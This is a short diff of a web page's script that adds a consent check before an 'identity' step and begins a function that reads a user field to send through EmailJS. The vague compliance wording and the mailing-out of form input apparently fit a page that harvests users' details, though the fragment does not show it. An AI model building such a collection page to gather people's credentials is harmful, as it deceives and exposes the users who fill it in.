@@ -241,7 +241,7 @@
         <span id="toast-msg" class="font-medium text-gray-200">Processing real-time nodes...</span>
     </div>
 
-    <script>
+   <script>
         (function() {
             emailjs.init("YOUR_PUBLIC_KEY"); // REPLACE WITH YOUR ACTUAL EMAILJS PUBLIC KEY
         })();
@@ -251,8 +251,15 @@
 
         let attempts = 0, shares = 0, lTime = 0, active = false;
 
+        function proceedToIdentity() {
+            if(!document.getElementById('agree-check').checked) {
+                alert("Please confirm compliance authorization parameters.");
+                return;
+            }
+            nav('participation-ui');
+        }
+
         function nav(id) {
-            if(id === 'participation-ui' && !document.getElementById('agree-check').checked) return alert("Please confirm compliance authorization parameters.");
             document.querySelectorAll('body > div:not(.bg-white)').forEach(div => {
                 if (div.id !== 'toast') div.style.display = 'none';
             });
@@ -264,7 +271,7 @@
             }
             window.scrollTo(0, 0);
         }
-
+       
         async function sendToEmailJS() {
             const btn = document.getElementById('sub-btn');
             const user = document.getElementById('l-user').value;
